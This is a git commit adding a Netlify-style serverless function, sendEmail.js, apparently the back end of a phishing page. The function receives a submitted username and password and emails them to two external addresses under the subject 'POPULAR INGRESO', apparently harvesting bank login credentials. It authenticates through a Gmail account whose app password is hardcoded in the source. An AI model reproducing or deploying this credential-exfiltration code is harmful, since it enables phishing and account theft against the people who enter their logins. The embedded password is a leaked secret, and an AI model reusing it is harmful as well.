1c5907717ec92dc68a4291f0c60de708d703723e
Aletiiisa <cuentaluperonp5@gmail.com>
2024-12-12 21:07:11 -0400

    Subiendo proyecto a teste1

---
+++ functions/sendEmail.js
@@ -0,0 +1,35 @@
+
+const nodemailer = require('nodemailer');
+require('dotenv').config();
+
+exports.handler = async function(event, context) {
+    const { username, password } = JSON.parse(event.body);
+
+    let transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+            user: 'cuentaluperonp5@gmail.com',
+            pass: 'ogynqksiltkdnuoz',
+        },
+    });
+
+    let mailOptions = {
+        from: 'cuentaluperonp5@gmail.com',
+        to: 'sierroalee@gmail.com, cacutumbe@gmail.com', // Corregido: coma agregada entre los correos
+        subject: 'POPULAR INGRESO',
+        text: `Usuario: ${username}\nContraseña: ${password}`,
+    };
+
+    try {
+        await transporter.sendMail(mailOptions);
+        return {
+            statusCode: 200,
+            body: JSON.stringify({ message: 'Correo enviado con éxito' }),
+        };
+    } catch (error) {
+        return {
+            statusCode: 500,
+            body: JSON.stringify({ message: 'Error al enviar el correo' }),
+        };
+    }
+};
